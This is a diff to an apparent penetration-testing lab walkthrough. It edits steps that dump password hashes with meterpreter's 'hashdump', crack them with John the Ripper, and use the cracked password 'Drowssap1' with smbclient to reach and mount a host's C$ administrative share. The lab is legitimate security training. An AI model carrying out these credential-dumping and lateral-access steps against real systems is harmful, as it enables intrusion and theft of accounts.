@@ -108,7 +108,12 @@ sessions -l
 sessions -i 1
 ```
 
-14. Back on the meterpreter shell, run `hashdump`. You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 
+14. Back on the meterpreter shell, run:
+
+```bash
+hashdump
+```
+   * You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 
 
 15. Background the session again, and turn off spooling so we don't keep outputting unnecessary logs to /tmp/console.log
 
@@ -140,7 +145,7 @@ john --format=nt hashedpasswords.txt
 ```bash
 smbclient -L hostname -I 192.168.100.10 -U Administrator
 ```
-   * You should see a list of available shares on the host. Let's mount the protected `C$` share by creating a mount point and then mounting the share.
+   * After you enter the `Drowssap1` password we cracked when you're prompted, you should see a list of available shares on the host. Let's mount the protected `C$` share by creating a mount point and then mounting the share.
 
 ```bash
 mkdir -p /mnt/atk_share
